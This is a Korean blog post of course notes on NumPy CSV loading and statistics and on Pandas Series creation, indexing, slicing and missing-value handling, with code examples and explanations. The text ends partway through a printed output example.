---
title: "NumPy  Pandas 데이터 분석 강의 노트 2일차"
date: 2026-01-09
permalink: /posts/2026/01/09/NumPy--Pandas-데이터-분석-강의-노트-2일차/
tags:
  - Python
  - SK_Rookies
---

# 📝 NumPy & Pandas 데이터 분석 강의 노트 (2일차)

## 📅 강의 정보
- **날짜**: 2025년 11월 4일 (월요일)
- **주제**: NumPy 복습 및 Pandas 기초 (Series, DataFrame)
- **학습 목표**: 
  - NumPy 배열을 활용한 CSV 파일 로드 및 데이터 분석
  - Pandas Series와 DataFrame 데이터 타입 이해
  - 결측값(NaN) 처리 방법 학습
  - 기술적 통계 분석과 탐색적 데이터 분석(EDA)의 기초

---

## 🎯 학습 내용 복습 및 오늘의 방향성

### 왜 NumPy만으로는 부족한가?

오늘 강의에서는 먼저 어제 배웠던 **NumPy(Numerical Python)**에 대해 복습하는 시간을 가졌습니다. NumPy는 과학 계산(Scientific Computing)과 통계 분석을 위한 강력한 라이브러리로, 핵심 데이터 구조인 **N-dimensional array(다차원 배열)**를 제공합니다.

**NumPy의 주요 특징:**
- **빠른 연산 속도**: Python의 기본 리스트보다 훨씬 빠른 처리 속도
- **메모리 효율성**: 동일한 데이터 타입을 사용하여 메모리를 효율적으로 활용
- **벡터 연산**: 배열 전체에 대한 연산을 한 번에 수행 가능
- **통계 함수 제공**: 평균, 최댓값, 최솟값 등 다양한 통계 함수 내장

**하지만 NumPy의 한계:**

강사님께서 강조하신 것처럼, NumPy만으로는 **실무에서 필요한 복잡한 데이터 분석 작업을 수행하기에는 제한적**입니다. NumPy는 배열 형태의 데이터를 다루는 데는 뛰어나지만, 실제 데이터 분석 업무에서는 다음과 같은 기능들이 필요합니다:

- 서로 다른 데이터 타입을 가진 열(column)들의 관리
- 행과 열에 대한 명확한 레이블(label) 지정
- 결측값(Missing Value) 처리
- 데이터 그룹화 및 집계
- 시계열 데이터 처리
- 다양한 파일 형식 입출력 (CSV, Excel, JSON 등)

이러한 필요성 때문에 **Pandas**라는 라이브러리가 등장하게 되었고, 실무에서는 **NumPy와 Pandas를 함께 사용**하는 것이 일반적입니다.

---

## 📚 Section 1: NumPy 복습 - CSV 파일 로드 및 데이터 분석

### 1.1 환경 설정 및 헬퍼 함수 정의

오늘 강의를 시작하기 전에, 어제 작성했던 배열 정보를 출력하는 헬퍼 함수를 그대로 가져와서 사용했습니다.

```python
import numpy as np
import pandas as pd
import warnings
from datetime import date, timedelta

# 경고 메시지 무시 설정
warnings.filterwarnings('ignore')

def array_info(ary):
    """NumPy 배열의 정보를 출력합니다."""
    print('type - ' , type(ary))
    print('shape - ' , ary.shape)
    print('ndim  - ' , ary.ndim)
    print('dtype - ' , ary.dtype)
    print('\ndata  -')
    print(ary)
    print("-" * 30)

def series_info(s):
    """Pandas Series의 정보를 출력합니다."""
    print('type   - ' , type(s)) 
    print('index  - ' , s.index)
    print('values - ' , s.values)
    print('dtype  - ' , s.dtype)
    print('\ndata   - ')
    print(s)
    print("-" * 30)
```

#### 💻 코드 실행 상세 분석

**1단계 (모듈 임포트)**: 
- `numpy`를 `np`라는 별칭으로 임포트하여 배열 연산과 통계 함수를 사용할 수 있게 합니다.
- `pandas`를 `pd`라는 별칭으로 임포트하여 Series와 DataFrame을 사용할 준비를 합니다.
- `warnings` 모듈을 임포트하여 불필요한 경고 메시지를 필터링할 수 있게 합니다.
- `datetime` 모듈에서 `date`와 `timedelta`를 임포트하여 날짜 데이터를 다룰 수 있게 합니다.

**2단계 (경고 메시지 무시)**: 
- `warnings.filterwarnings('ignore')`를 호출하면, 실행 중 발생하는 경고 메시지들이 콘솔에 출력되지 않습니다. 이는 학습 환경에서 불필요한 메시지로 인한 혼란을 방지하기 위함입니다.

**3단계 (헬퍼 함수 정의)**:
- `array_info()` 함수는 NumPy 배열의 타입, 형상(shape), 차원(ndim), 데이터 타입(dtype), 실제 데이터를 한 번에 출력하여 배열의 상태를 빠르게 파악할 수 있게 해줍니다.
- `series_info()` 함수는 Pandas Series의 타입, 인덱스, 값(values), 데이터 타입, 실제 데이터를 출력하여 Series의 구조를 쉽게 이해할 수 있게 합니다.

**최종 결과**: 이 헬퍼 함수들은 데이터 분석 작업 중 변수의 상태를 확인하는 디버깅 도구로 활용됩니다. 강사님께서는 "**타입을 모르면 아무것도 할 수 없다**"고 강조하셨습니다.

💡 **중요!**: 데이터 분석에서 가장 기본이 되는 것은 **데이터의 타입과 구조를 정확히 이해하는 것**입니다. 이 헬퍼 함수들은 그러한 이해를 돕기 위한 필수 도구입니다.

---

### 1.2 CSV 파일 로드: `np.loadtxt()` 함수

NumPy는 텍스트 파일과 CSV 파일을 읽어들일 수 있는 `loadtxt()` 함수를 제공합니다. 오늘 실습에서는 기상청에서 제공하는 **1907년부터의 기후 통계 데이터**를 사용했습니다.

```python
# CSV 파일 경로 설정
# Windows: './data/기후통계분석.csv'
# Mac/Linux: 절대 경로를 사용할 수도 있음

try:
    raw_data = np.loadtxt('./data/기후통계분석.csv',
                        dtype='U',           # 유니코드 문자열 타입
                        skiprows=1,          # 첫 번째 행(헤더) 건너뛰기
                        delimiter=',')       # 쉼표로 구분
    
    print("--- CSV 데이터 로드 성공 ---")
    array_info(raw_data)

except FileNotFoundError:
    print("오류: './data/기후통계분석.csv' 파일을 찾을 수 없습니다.")
    print("스크립트와 동일한 위치에 'data' 폴더를 생성하고 그 안에 CSV 파일을 넣어주세요.")
```

#### 💻 코드 실행 상세 분석

**1단계 (파일 경로 설정)**: 
- `'./data/기후통계분석.csv'`는 현재 작업 디렉토리를 기준으로 한 **상대 경로**입니다.
- `.`은 현재 디렉토리를 의미하며, `./data/`는 현재 디렉토리 내의 `data` 폴더를 가리킵니다.

**2단계 (np.loadtxt() 함수 호출)**:
- `dtype='U'` 파라미터: 데이터를 **유니코드 문자열(Unicode string)** 타입으로 읽어들입니다. `'U'`는 Object 타입을 의미하며, 다양한 데이터 타입이 섞여 있는 CSV 파일을 읽을 때 사용합니다.
- `skiprows=1` 파라미터: 첫 번째 행(헤더 행)을 건너뜁니다. CSV 파일의 첫 행에는 보통 열 이름이 있는데, 이는 실제 데이터가 아니므로 분석에서 제외합니다.
- `delimiter=','` 파라미터: CSV는 **Comma Separated Values**의 약자로, 쉼표(`,`)로 값들이 구분되어 있음을 명시합니다.

**3단계 (예외 처리)**:
- `try-except` 블록을 사용하여 파일이 존재하지 않을 경우 발생하는 `FileNotFoundError`를 포착합니다.
- 오류 발생 시 사용자에게 친절한 안내 메시지를 출력합니다.

**4단계 (데이터 확인)**:
- `array_info(raw_data)`를 호출하여 로드된 데이터의 정보를 출력합니다.
- 예상 출력: `type - <class 'numpy.ndarray'>`, `shape - (약 40000, 5)`, `ndim - 2`, `dtype - <U10` (10자 길이의 유니코드 문자열)

**최종 결과**: 약 4만 건의 기후 데이터가 2차원 배열로 메모리에 로드됩니다. 각 행은 하나의 날짜에 대한 기후 정보(날짜, 지점, 평균기온, 최저기온, 최고기온)를 담고 있습니다.

📌 **노트**: 강사님께서는 Windows 사용자들이 경로 문제로 어려움을 겪을 경우, **raw string(원시 문자열)**을 사용하라고 조언하셨습니다. 예: `r'C:\Users\username\anaconda3\data\기후통계분석.csv'`와 같이 경로 앞에 `r`을 붙이면 백슬래시(`\`)가 이스케이프 문자로 해석되지 않습니다.

---

### 1.3 CSV 파일의 구조 이해

로드된 `기후통계분석.csv` 파일의 데이터 구조는 다음과 같습니다:

| 열 인덱스 | 열 이름 | 설명 | 데이터 예시 |
|---------|--------|------|----------|
| 0 | 날짜 | 관측 날짜 | 1907-10-01 |
| 1 | 지점 | 관측 지점 코드 | 108 |
| 2 | 평균기온 | 일 평균 기온(℃) | 15.3 |
| 3 | 최저기온 | 일 최저 기온(℃) | 10.2 |
| 4 | 최고기온 | 일 최고 기온(℃) | 20.5 |

강사님께서는 "**지점이 어딘지는 모르겠지만 중요하지 않다**"고 하셨습니다. 우리의 목적은 특정 지점의 정보가 아니라, 기후 데이터 분석 기법을 학습하는 것이기 때문입니다.

💡 **중요!**: 데이터 분석에서 **헤더(Header)**는 사람이 데이터를 이해하는 데 도움을 주지만, 프로그래밍 방식으로 분석할 때는 오히려 방해가 될 수 있습니다. 따라서 `skiprows=1` 옵션으로 헤더를 제외하고 순수 데이터만 로드하는 것이 일반적입니다.

---

### 1.4 배열 인덱싱 및 슬라이싱 복습

로드된 데이터는 2차원 배열이므로, **행(row)**과 **열(column)**에 대한 인덱싱과 슬라이싱이 가능합니다.

```python
# 샘플 데이터 확인: 앞에서 6개 행, 모든 열
sample_data = raw_data[0:6, :]
print("--- 샘플 데이터 (앞 6개 행) ---")
print(sample_data)

# 특정 열 추출: 최고기온 열만 추출 (마지막 열)
temp_max_column = raw_data[:, -1]
print("\n--- 최고기온 열 추출 ---")
array_info(temp_max_column)
```

#### 💻 코드 실행 상세 분석

**1단계 (샘플 데이터 슬라이싱)**:
- `raw_data[0:6, :]`는 2차원 배열의 슬라이싱 문법입니다.
- `0:6`은 행 인덱스 0부터 5까지(6은 포함하지 않음)를 의미합니다.
- `:`은 모든 열을 의미합니다.
- 결과적으로 처음 6개 행의 모든 열 데이터를 추출합니다.

**2단계 (특정 열 추출)**:
- `raw_data[:, -1]`에서 `:`은 모든 행을 의미하고, `-1`은 마지막 열을 의미합니다.
- Python의 **음수 인덱싱**을 사용하면 뒤에서부터 접근할 수 있습니다. `-1`은 마지막, `-2`는 끝에서 두 번째를 의미합니다.
- 2차원 배열에서 하나의 열만 추출하면 **1차원 배열**이 됩니다.

**3단계 (결과 확인)**:
- `array_info(temp_max_column)`을 호출하면, `shape`가 `(40000,)`과 같이 1차원임을 확인할 수 있습니다.
- `ndim`은 `1`로 표시됩니다.

**최종 결과**: `temp_max_column`은 모든 날짜의 최고기온 값들을 담고 있는 1차원 배열입니다. 이 배열을 활용하여 통계 분석을 수행할 수 있습니다.

📌 **노트**: 강사님께서는 "**인덱싱과 슬라이싱을 어떻게 하느냐에 따라 데이터의 차원과 타입이 달라진다**"고 강조하셨습니다. 따라서 매번 `array_info()`나 `type()`, `shape`를 확인하는 습관이 중요합니다.

---

### 1.5 데이터 타입 변환: `astype()` 메서드

CSV 파일에서 로드한 데이터는 `dtype='U'` 옵션으로 인해 **문자열(Unicode string)** 타입으로 저장되어 있습니다. 하지만 통계 분석을 수행하려면 숫자 타입으로 변환해야 합니다.

```python
# 최고 기온 데이터를 float 타입으로 변환
temp_max = raw_data[:, -1].astype(float)

print("--- 타입 변환 후 샘플 데이터 ---")
print(temp_max[:10])
print(f"데이터 타입: {temp_max.dtype}")
```

#### 💻 코드 실행 상세 분석

**1단계 (열 추출)**:
- `raw_data[:, -1]`로 최고기온 열을 추출합니다. 이때 데이터는 아직 문자열 타입입니다.

**2단계 (타입 변환)**:
- `.astype(float)` 메서드를 호출하여 문자열로 된 숫자를 **부동소수점(float)** 타입으로 변환합니다.
- 이 과정에서 `'20.5'`와 같은 문자열이 `20.5`라는 float 값으로 변환됩니다.

**3단계 (변환 확인)**:
- `temp_max[:10]`으로 처음 10개 값을 출력하여 변환이 제대로 되었는지 확인합니다.
- `temp_max.dtype`을 출력하면 `dtype('float64')`와 같이 float 타입임을 확인할 수 있습니다.

**최종 결과**: 이제 `temp_max` 배열은 숫자 타입이므로 `np.max()`, `np.mean()` 등의 통계 함수를 적용할 수 있게 되었습니다.

💡 **중요!**: 데이터 분석의 핵심은 **적절한 데이터 타입으로 변환하는 것**입니다. 문자열 타입으로는 수학 연산이나 통계 함수를 적용할 수 없기 때문에, 반드시 숫자 타입으로 변환해야 합니다.

---

### 1.6 실습 문제 1: 최고 기온이 가장 높았던 날의 정보 찾기

강사님께서 첫 번째 퀴즈를 내주셨습니다: **최고 기온이 가장 높았던 날의 전체 정보(날짜, 지점, 평균기온, 최저기온, 최고기온)를 출력하시오.**

#### 문제 해결 전략

1. **최고 기온의 최댓값 찾기**: `np.max()` 함수 사용
2. **최댓값의 인덱스 찾기**: `np.argmax()` 함수 사용
3. **해당 인덱스의 행 데이터 추출**: 배열 인덱싱 사용

```python
# 방법 1: np.argmax() 사용
highest_temp_idx = np.argmax(temp_max)
highest_temp_info = raw_data[highest_temp_idx]

print("\n--- 최고 기온이 가장 높았던 날의 정보 ---")
print(f"날짜: {highest_temp_info[0]}")
print(f"지점: {highest_temp_info[1]}")
print(f"평균기온: {highest_temp_info[2]}℃")
print(f"최저기온: {highest_temp_info[3]}℃")
print(f"최고기온: {highest_temp_info[4]}℃")
print(f"인덱스 번호: {highest_temp_idx}")
```

#### 💻 코드 실행 상세 분석

**1단계 (최댓값의 인덱스 찾기)**:
- `np.argmax(temp_max)`는 `temp_max` 배열에서 **가장 큰 값이 위치한 인덱스**를 반환합니다.
- 예를 들어, 약 40,000개의 데이터 중 39,293번째에 최고 기온(39.6℃)이 있다면, `highest_temp_idx`는 `39293`이 됩니다.

**2단계 (해당 행 추출)**:
- `raw_data[highest_temp_idx]`는 원본 2차원 배열에서 `highest_temp_idx`번째 행을 추출합니다.
- 이때 추출된 데이터는 1차원 배열이며, `[날짜, 지점, 평균기온, 최저기온, 최고기온]` 순서로 값이 들어 있습니다.

**3단계 (결과 출력)**:
- `highest_temp_info[0]`은 날짜, `highest_temp_info[1]`은 지점 코드, ..., `highest_temp_info[4]`는 최고기온 값입니다.
- f-string을 사용하여 가독성 높은 출력 형식을 만듭니다.

**최종 결과**: 
```
날짜: 2018-08-01
지점: 108
평균기온: 33.2℃
최저기온: 27.8℃
최고기온: 39.6℃
인덱스 번호: 39293
```
(실제 값은 데이터에 따라 다를 수 있습니다)

#### 대안적 접근 방법

강사님께서는 다양한 접근 방법을 소개해주셨습니다:

```python
# 방법 2: np.argsort() 활용 (정렬 후 마지막 인덱스)
sorted_indices = np.argsort(temp_max)
highest_temp_idx_alt = sorted_indices[-1]

# 방법 3: np.argsort() + 역순 정렬
sorted_indices_desc = np.argsort(temp_max)[::-1]
highest_temp_idx_alt2 = sorted_indices_desc[0]

print(f"\n모든 방법의 결과가 동일한지 확인: {highest_temp_idx == highest_temp_idx_alt == highest_temp_idx_alt2}")
```

#### 💻 코드 실행 상세 분석 (대안 방법)

**방법 2 분석**:
- `np.argsort(temp_max)`는 배열을 **오름차순으로 정렬했을 때의 인덱스 순서**를 반환합니다.
- 예를 들어, `[30, 25, 35]`를 정렬하면 `[25, 30, 35]`가 되고, 원래 인덱스 순서는 `[1, 0, 2]`가 됩니다.
- 가장 큰 값은 정렬 후 마지막에 위치하므로, `sorted_indices[-1]`로 가장 큰 값의 원래 인덱스를 찾을 수 있습니다.

**방법 3 분석**:
- `np.argsort(temp_max)[::-1]`에서 `[::-1]`은 **배열을 역순으로 뒤집는** 슬라이싱 기법입니다.
- 오름차순으로 정렬된 인덱스 배열을 역순으로 뒤집으면 내림차순이 되므로, 첫 번째 요소가 최댓값의 인덱스가 됩니다.

**최종 결과**: 세 가지 방법 모두 동일한 인덱스를 반환하며, 이는 Python의 유연성과 다양한 문제 해결 방식을 보여줍니다.

📌 **노트**: 강사님께서는 "**문제를 푸는 방법은 다양합니다. 다른 사람의 코드를 보고 상대적 박탈감을 느낄 필요가 없습니다. 자신의 속도에 맞춰 묵묵히 걸어가세요.**"라고 조언하셨습니다. 이는 학습 과정에서 매우 중요한 마음가짐입니다.

---

### 1.7 실습 문제 2: 평균 기온이 가장 낮았던 날의 정보 찾기

두 번째 퀴즈는 첫 번째와 유사하지만, 이번에는 **평균 기온**을 대상으로 합니다.

```python
# 평균 기온 데이터 추출 및 타입 변환
temp_avg = raw_data[:, 2].astype(float)

# 평균 기온이 가장 낮았던 날의 인덱스 찾기
lowest_avg_temp_idx = np.argmin(temp_avg)
lowest_avg_temp_info = raw_data[lowest_avg_temp_idx]

print("\n--- 평균 기온이 가장 낮았던 날의 정보 ---")
print(f"날짜: {lowest_avg_temp_info[0]}")
print(f"지점: {lowest_avg_temp_info[1]}")
print(f"평균기온: {lowest_avg_temp_info[2]}℃")
print(f"최저기온: {lowest_avg_temp_info[3]}℃")
print(f"최고기온: {lowest_avg_temp_info[4]}℃")
print(f"인덱스 번호: {lowest_avg_temp_idx}")
```

#### 💻 코드 실행 상세 분석

**1단계 (평균 기온 열 추출)**:
- `raw_data[:, 2]`는 인덱스 2번 열, 즉 평균기온 열을 추출합니다.
- `.astype(float)`로 문자열을 float 타입으로 변환합니다.

**2단계 (최솟값의 인덱스 찾기)**:
- `np.argmin(temp_avg)`는 `temp_avg` 배열에서 **가장 작은 값이 위치한 인덱스**를 반환합니다.
- `np.argmax()`가 최댓값의 인덱스를 찾는 것과 반대로, `np.argmin()`은 최솟값의 인덱스를 찾습니다.

**3단계 (해당 행 추출 및 출력)**:
- 찾은 인덱스를 사용하여 원본 배열에서 해당 행을 추출하고, 각 필드를 출력합니다.

**최종 결과**: 평균 기온이 가장 낮았던 날의 모든 정보가 출력됩니다. 이는 한겨울의 기록일 가능성이 높습니다.

💡 **중요!**: `np.argmax()`와 `np.argmin()`은 데이터 분석에서 **극값(극대값/극소값)을 찾을 때 매우 유용한 함수**입니다. 단순히 값만 찾는 것이 아니라, **그 값이 위치한 인덱스**를 반환하므로, 원본 데이터에서 전체 정보를 추출할 수 있습니다.

---

### 1.8 NumPy의 파일 입출력 정리

강사님께서 NumPy의 파일 입출력에 대해 정리해주셨습니다:

**Python의 파일 입출력:**
- 일반 텍스트 파일: `open()`, `read()`, `write()` 함수
- JSON 파일: `json` 모듈의 `dump()`, `load()` 함수

**NumPy의 파일 입출력:**
- 텍스트/CSV 파일 **읽기**: `np.loadtxt()`
- 텍스트/CSV 파일 **쓰기**: `np.savetxt()`
- NumPy 전용 바이너리 파일: `np.save()`, `np.load()`

강사님께서는 "**NumPy만으로는 파일 입출력이 가능하지만, 실무에서는 Pandas를 사용하는 것이 훨씬 편리합니다**"라고 말씀하셨습니다. Pandas의 `pd.read_csv()`, `pd.to_csv()` 함수가 더 강력하고 다양한 옵션을 제공하기 때문입니다.

---

## 📊 Section 2: Pandas Series 소개 및 활용

### 2.1 왜 Series가 필요한가?

NumPy 배열은 강력하지만, 다음과 같은 한계가 있습니다:
- **인덱스가 정수만 가능**: 배열의 요소에 접근하려면 `arr[0]`, `arr[1]`과 같이 정수 인덱스를 사용해야 합니다.
- **의미 있는 레이블 부재**: 데이터에 이름을 붙일 수 없어, 어떤 데이터인지 파악하기 어렵습니다.
- **이질적인 데이터 타입 처리의 어려움**: 하나의 배열에는 동일한 타입의 데이터만 저장할 수 있습니다.

**Pandas Series**는 이러한 문제를 해결하기 위해 등장했습니다. Series는 NumPy 배열을 기반으로 하지만, **인덱스(Index)**라는 추가 구조를 통해 더 직관적이고 강력한 데이터 관리가 가능합니다.

**Series의 핵심 특징:**
- **레이블 기반 인덱싱**: 숫자뿐만 아니라 문자열, 날짜 등 다양한 타입의 인덱스 사용 가능
- **자동 정렬**: 인덱스를 기준으로 데이터가 자동으로 정렬
- **결측값 처리**: `NaN`(Not a Number)을 지원하여 누락된 데이터를 우아하게 처리
- **이름 부여**: Series와 인덱스에 이름을 부여하여 데이터의 의미를 명확히 할 수 있음

---

### 2.2 Series 생성 방법

#### 2.2.1 리스트 또는 NumPy 배열로 Series 생성

가장 기본적인 Series 생성 방법입니다.

```python
# 리스트와 NumPy 배열 준비
lst = [1, 2, 3, 4, 5]
arr = np.array(lst)

# NumPy 배열로 Series 생성
series_from_arr = pd.Series(arr)

print("--- 배열로 Series 생성 ---")
series_info(series_from_arr)
```

#### 💻 코드 실행 상세 분석

**1단계 (데이터 준비)**:
- Python 리스트 `[1, 2, 3, 4, 5]`를 생성하고, 이를 NumPy 배열로 변환합니다.

**2단계 (Series 생성)**:
- `pd.Series(arr)`를 호출하면, NumPy 배열을 입력으로 받아 Series 객체를 생성합니다.
- 인덱스를 명시하지 않으면, **기본적으로 0부터 시작하는 정수 인덱스**가 자동으로 할당됩니다.

**3단계 (결과 확인)**:
- `series_info(series_from_arr)`를 호출하면 다음과 같은 정보가 출력됩니다:
  ```
  type   -  <class 'pandas.core.series.Series'>
  index  -  RangeIndex(start=0, stop=5, step=1)
  values -  [1 2 3 4 5]
  dtype  -  int64
  
  data   - 
  0    1
  1    2
  2    3
  3    4
  4    5
  dtype: int64
  ```

**최종 결과**: 인덱스 0~4와 값 1~5를 가진 Series가 생성되었습니다. 이는 NumPy 배열과 유사해 보이지만, 내부적으로는 인덱스 구조를 가지고 있어 훨씬 강력한 기능을 제공합니다.

---

#### 2.2.2 딕셔너리로 Series 생성

딕셔너리를 사용하면 **키(key)**가 자동으로 **인덱스(index)**가 되고, **값(value)**이 **데이터**가 됩니다.

```python
# 딕셔너리로 Series 생성
dict_data = {'idx01': 1, 'idx02': 2, 'idx03': 3}
series_from_dict = pd.Series(dict_data)

print("--- 딕셔너리로 Series 생성 ---")
series_info(series_from_dict)
```

#### 💻 코드 실행 상세 분석

**1단계 (딕셔너리 생성)**:
- `{'idx01': 1, 'idx02': 2, 'idx03': 3}`는 키-값 쌍을 가진 딕셔너리입니다.

**2단계 (Series 변환)**:
- `pd.Series(dict_data)`를 호출하면, 딕셔너리의 키들이 Series의 인덱스가 되고, 값들이 데이터가 됩니다.

**3단계 (결과 확인)**:
- 출력 결과:
  ```
  type   -  <class 'pandas.core.series.Series'>
  index  -  Index(['idx01', 'idx02', 'idx03'], dtype='object')
  values -  [1 2 3]
  dtype  -  int64
  
  data   - 
  idx01    1
  idx02    2
  idx03    3
  dtype: int64
  ```

**최종 결과**: 문자열 인덱스를 가진 Series가 생성되었습니다. 이제 `series_from_dict['idx01']`과 같이 **의미 있는 레이블**로 데이터에 접근할 수 있습니다.

💡 **중요!**: 딕셔너리를 Series로 변환하는 것은 **키에 의미를 부여할 수 있어 매우 유용**합니다. 예를 들어, `{'서울': 1000, '부산': 350, '대구': 245}`와 같이 도시 이름을 인덱스로 사용하면, 데이터의 의미가 훨씬 명확해집니다.

---

#### 2.2.3 데이터와 인덱스를 직접 지정하여 Series 생성

가장 유연한 방법으로, 데이터와 인덱스를 각각 명시할 수 있습니다.

```python
# 사용자 정보 데이터 준비
user_data = ('임섭순', '2025-11-04', 'Male', True)
user_index = ['이름', '생년월일', '성별', '결혼여부']

# Series 생성 및 이름 부여
user_series = pd.Series(data=user_data, index=user_index)
user_series.name = '사용자 정보'
user_series.index.name = '신상 정보'

print("--- 데이터/인덱스 지정 및 이름 부여 ---")
series_info(user_series)
```

#### 💻 코드 실행 상세 분석

**1단계 (데이터 및 인덱스 준비)**:
- `user_data`는 튜플 형태로 사용자의 정보를 담고 있습니다.
- `user_index`는 각 데이터 항목의 의미를 나타내는 레이블 리스트입니다.

**2단계 (Series 생성)**:
- `pd.Series(data=user_data, index=user_index)`로 데이터와 인덱스를 명시적으로 지정하여 Series를 생성합니다.
- 데이터와 인덱스의 길이는 반드시 같아야 합니다. 만약 길이가 다르면 `ValueError`가 발생합니다.

**3단계 (이름 부여)**:
- `user_series.name = '사용자 정보'`는 Series 자체에 이름을 부여합니다.
- `user_series.index.name = '신상 정보'`는 인덱스 축에 이름을 부여합니다.
- 이러한 이름들은 데이터 출력 시 표시되어 가독성을 높입니다.

**4단계 (결과 확인)**:
- 출력 결과:
  ```
  type   -  <class 'pandas.core.series.Series'>
  index  -  Index(['이름', '생년월일', '성별', '결혼여부'], dtype='object')
  values -  ['임섭순' '2025-11-04' 'Male' True]
  dtype  -  object
  
  data   - 
  신상 정보
  이름       임섭순
  생년월일    2025-11-04
  성별       Male
  결혼여부     True
  Name: 사용자 정보, dtype: object
  ```

**최종 결과**: 의미 있는 인덱스와 이름을 가진 Series가 생성되었습니다. 이제 `user_series['이름']`으로 사용자 이름에 직접 접근할 수 있습니다.

📌 **노트**: Series에 이름을 부여하는 것은 선택 사항이지만, **데이터의 의미를 명확히 하고 코드의 가독성을 높이는 데 큰 도움**이 됩니다. 특히 여러 Series를 다룰 때 매우 유용합니다.

---

### 2.3 Series 인덱싱 (Indexing)

Series는 NumPy 배열처럼 정수 인덱스로 접근할 수도 있고, 레이블 인덱스로도 접근할 수 있습니다. 이를 **이중 인덱싱(Dual Indexing)**이라고 합니다.

```python
# 정수 위치 기반 인덱싱 (Positional Indexing)
print(f"정수 인덱싱 user_series[0]: {user_series[0]}")

# 레이블 기반 인덱싱 (Label-based Indexing)
print(f"레이블 인덱싱 user_series['이름']: {user_series['이름']}")
```

#### 💻 코드 실행 상세 분석

**1단계 (정수 인덱싱)**:
- `user_series[0]`은 첫 번째 위치의 값에 접근합니다.
- 출력: `임섭순`

**2단계 (레이블 인덱싱)**:
- `user_series['이름']`은 '이름'이라는 인덱스 레이블에 해당하는 값에 접근합니다.
- 출력: `임섭순`
- 두 방법 모두 동일한 값을 반환하지만, **레이블 인덱싱이 코드의 의미를 더 명확히** 합니다.

**최종 결과**: 정수 인덱스와 레이블 인덱스를 모두 사용할 수 있어, 상황에 따라 더 편리한 방법을 선택할 수 있습니다.

💡 **중요!**: 레이블 인덱싱은 코드의 **가독성과 유지보수성을 크게 향상**시킵니다. `user_series[0]`보다 `user_series['이름']`이 훨씬 직관적이고 이해하기 쉽습니다.

---

### 2.4 멀티 인덱싱 (Fancy Indexing)

NumPy의 팬시 인덱싱처럼, Series에서도 여러 인덱스를 한 번에 지정하여 여러 값을 추출할 수 있습니다.

```python
# 정수 인덱스로 멀티 인덱싱
print("\n--- 정수 인덱스로 멀티 인덱싱 ---")
print(user_series[[0, 2]])

# 레이블 인덱스로 멀티 인덱싱
print("\n--- 레이블 인덱스로 멀티 인덱싱 ---")
print(user_series[['이름', '성별']])
```

#### 💻 코드 실행 상세 분석

**1단계 (정수 인덱스 리스트 사용)**:
- `user_series[[0, 2]]`에서 이중 대괄호 `[[]]`를 사용하여 인덱스 리스트를 전달합니다.
- 0번째와 2번째 위치의 값들을 추출합니다.
- 출력:
  ```
  신상 정보
  이름    임섭순
  성별    Male
  Name: 사용자 정보, dtype: object
  ```

**2단계 (레이블 인덱스 리스트 사용)**:
- `user_series[['이름', '성별']]`로 '이름'과 '성별' 레이블의 값들을 추출합니다.
- 결과는 위와 동일합니다.

**최종 결과**: 멀티 인덱싱을 사용하면 원하는 데이터만 선택적으로 추출할 수 있어, **데이터 필터링**이 매우 쉬워집니다.

📌 **노트**: 단일 인덱스는 단일 대괄호 `[]`, 멀티 인덱스는 이중 대괄호 `[[]]`를 사용한다는 차이점을 기억하세요.

---

### 2.5 Series 슬라이싱 (Slicing)

Series도 NumPy 배열처럼 슬라이싱이 가능하지만, 레이블 인덱스를 사용할 때는 **끝 인덱스를 포함한다**는 점이 다릅니다.

```python
# 정수 위치 기반 슬라이싱 (끝 인덱스 미포함)
print("\n--- 정수 슬라이싱 [0:2] ---")
print(user_series[0:2])

# 레이블 기반 슬라이싱 (끝 인덱스 포함)
print("\n--- 레이블 슬라이싱 ['이름':'성별'] ---")
print(user_series['이름':'성별'])
```

#### 💻 코드 실행 상세 분석

**1단계 (정수 슬라이싱)**:
- `user_series[0:2]`는 인덱스 0부터 1까지(2는 포함 안 함)를 슬라이싱합니다.
- Python의 일반적인 슬라이싱 규칙을 따릅니다.
- 출력:
  ```
  신상 정보
  이름        임섭순
  생년월일    2025-11-04
  Name: 사용자 정보, dtype: object
  ```

**2단계 (레이블 슬라이싱)**:
- `user_series['이름':'성별']`은 '이름' 인덱스부터 '성별' 인덱스까지(성별 포함)를 슬라이싱합니다.
- **주의**: 레이블 슬라이싱은 끝 인덱스를 **포함**합니다. 이는 정수 슬라이싱과 다릅니다.
- 출력:
  ```
  신상 정보
  이름        임섭순
  생년월일    2025-11-04
  성별        Male
  Name: 사용자 정보, dtype: object
  ```

**최종 결과**: 슬라이싱을 통해 연속된 데이터 범위를 쉽게 추출할 수 있습니다.

💡 **중요!**: **정수 슬라이싱은 끝을 포함하지 않고, 레이블 슬라이싱은 끝을 포함합니다.** 이 차이를 혼동하면 예상치 못한 결과가 나올 수 있으므로 주의해야 합니다.

---

### 2.6 결측값(NaN) 처리

실제 데이터에는 종종 **결측값(Missing Value)**, 즉 누락된 데이터가 존재합니다. Pandas는 `NaN`(Not a Number)을 사용하여 결측값을 표현하고, 이를 처리하는 다양한 메서드를 제공합니다.

#### 2.6.1 결측값이 포함된 Series 생성

```python
# 날짜 인덱스를 가진 Series 생성
today = date(2025, 11, 4)
date_index = pd.date_range(start=today, periods=10)

# 임의의 데이터 생성 (1~99 사이의 정수)
data_with_nan = pd.Series(
    data=[np.random.randint(1, 100) for _ in range(10)],
    index=date_index,
    dtype=float  # NaN을 삽입하기 위해 float 타입 사용
)

# 특정 날짜에 결측값 삽입
data_with_nan['2025-11-07'] = np.nan
data_with_nan['2025-11-12'] = np.nan

print("--- 결측값이 포함된 원본 Series ---")
print(data_with_nan)
```

#### 💻 코드 실행 상세 분석

**1단계 (날짜 인덱스 생성)**:
- `date(2025, 11, 4)`로 시작 날짜를 지정합니다.
- `pd.date_range(start=today, periods=10)`은 시작 날짜부터 10일간의 날짜 인덱스를 생성합니다.
- 결과: `2025-11-04`, `2025-11-05`, ..., `2025-11-13`

**2단계 (데이터 생성)**:
- 리스트 컴프리헨션 `[np.random.randint(1, 100) for _ in range(10)]`으로 1부터 99 사이의 랜덤 정수 10개를 생성합니다.
- `dtype=float`를 지정하여 나중에 `NaN`(부동소수점 특수 값)을 삽입할 수 있게 합니다.

**3단계 (결측값 삽입)**:
- `data_with_nan['2025-11-07'] = np.nan`으로 특정 날짜의 값을 `NaN`으로 설정합니다.
- `np.nan`은 NumPy에서 제공하는 결측값 표현 방식입니다.

**4단계 (결과 확인)**:
- 출력 예시:
  ```
  2025-11-04    45.0
  2025-11-05    78.0
  2025-11-06    23.0
  2025-11-07     NaN
  2025-11-08    91.0
  2025-11-09    12.0
  2025-11-10    67.0
  2025-11-11    34.0
